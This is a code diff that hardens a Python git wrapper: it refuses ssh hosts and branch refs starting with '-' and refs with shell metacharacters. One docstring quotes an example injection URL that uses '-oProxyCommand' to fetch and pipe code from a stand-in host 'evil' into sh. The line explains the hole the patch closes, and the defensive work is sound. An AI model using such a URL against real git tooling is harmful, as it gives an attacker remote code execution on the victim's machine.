@@ -29,9 +29,13 @@ exists so nobody "fixes" it back:
 * **``HOME`` is not redirected**, and neither is ``XDG_CONFIG_HOME``.
 * The URL is **validated**: ``https://``, ``ssh://``, ``git@host:path``,
   ``file://`` or an absolute path — never starting with ``-`` (git would read
-  it as an option) and never carrying a shell metacharacter. Fixed argv makes
-  a metacharacter inert; it is still refused, because defence that only works
-  when the *other* defence works is not defence.
+  it as an option), **never with an ssh host that starts with ``-``** (git
+  passes the host on to ssh, where ``-oProxyCommand=…`` is an option and the
+  ``--`` separator protects git's argv and not ssh's), and never carrying a
+  shell metacharacter. Fixed argv makes a metacharacter inert; it is still
+  refused, because defence that only works when the *other* defence works is
+  not defence. The **ref** is checked the same way, for the same reason: it
+  reaches ``--branch`` before the ``--``.
 """
 
 from __future__ import annotations
@@ -116,10 +120,43 @@ def validate_url(url) -> str:
             "Index urls are https://, ssh://, git@host:path, file:// or an "
             "absolute path")
     if url.startswith(_SCHEMES) or url.startswith("/") or _SCP_LIKE.match(url):
+        _refuse_option_host(url)
         return url
     raise ValidationError(
         f"refusing the git url {url!r}: expected https://, ssh://, "
         "git@host:path, file:// or an absolute path")
+
+
+def _refuse_option_host(url: str) -> None:
+    """Refuse a URL whose **host** would be read by ssh as an option.
+
+    Checking that the whole url does not start with ``-`` is not enough, and
+    the difference is a remote-code-execution hole rather than a nicety:
+    ``ssh://-oProxyCommand=curl%20evil|sh/x.git`` starts with ``s``, passes
+    every other rule, and git hands ``-oProxyCommand=…`` to **ssh** as an
+    argument, where a leading ``-`` is an option. The ``--`` separator in
+    :func:`run` protects git's own argv and does nothing about ssh's.
+
+    So the host component is extracted and checked on its own, for both
+    spellings of an ssh remote.
+    """
+    host = None
+    for scheme in ("ssh://", "git+ssh://"):
+        if url.startswith(scheme):
+            authority = url[len(scheme):].split("/", 1)[0]
+            host = authority.rpartition("@")[2]
+            break
+    else:
+        if _SCP_LIKE.match(url):
+            host = url.partition("@")[2].partition(":")[0]
+    if host is None:
+        return
+    if not host or host.startswith("-"):
+        raise ValidationError(
+            f"refusing the git url {url!r}: its host component {host!r} is "
+            f"empty or starts with '-', which ssh would read as an OPTION and "
+            f"not as a host. (git's own argv is protected by a '--' separator; "
+            f"the arguments it passes on to ssh are not.)")
 
 
 def run(*args: str, cwd=None, timeout: float = DEFAULT_TIMEOUT):
@@ -147,10 +184,31 @@ def run(*args: str, cwd=None, timeout: float = DEFAULT_TIMEOUT):
     return result
 
 
+def validate_ref(ref) -> str:
+    """The ref, or a ``ValidationError``.
+
+    ``--branch <ref>`` sits **before** the ``--`` separator, so a ref starting
+    with ``-`` is an option to git — the same class of hole as an option-shaped
+    host, and one line to close.
+    """
+    if not isinstance(ref, str) or not ref:
+        raise ValidationError("a git index needs a non-empty 'ref'")
+    if ref.startswith("-"):
+        raise ValidationError(
+            f"refusing the git ref {ref!r}: a value starting with '-' would be "
+            "read by git as an option, not a ref")
+    bad = sorted(_METACHARACTERS & set(ref))
+    if bad:
+        raise ValidationError(
+            f"refusing the git ref {ref!r}: it contains {''.join(bad)!r}")
+    return ref
+
+
 def clone(url: str, dest, ref: str) -> None:
     """`clone --depth 1` at ``ref``. The parent is created; ``dest`` is not
     (git makes it, and a pre-made empty directory is fine either way)."""
     validate_url(url)
+    validate_ref(ref)
     dest = Path(dest)
     dest.parent.mkdir(parents=True, exist_ok=True)
     run("clone", "--depth", "1", "--branch", ref, "--", url, str(dest))
@@ -164,6 +222,7 @@ def fetch(dest, url: str, ref: str) -> None:
     exists, and a merge would invent a document nobody published.
     """
     validate_url(url)
+    validate_ref(ref)
     dest = Path(dest)
     run("-C", str(dest), "fetch", "--depth", "1", "--", url, ref)
     run("-C", str(dest), "reset", "--hard", "FETCH_HEAD")
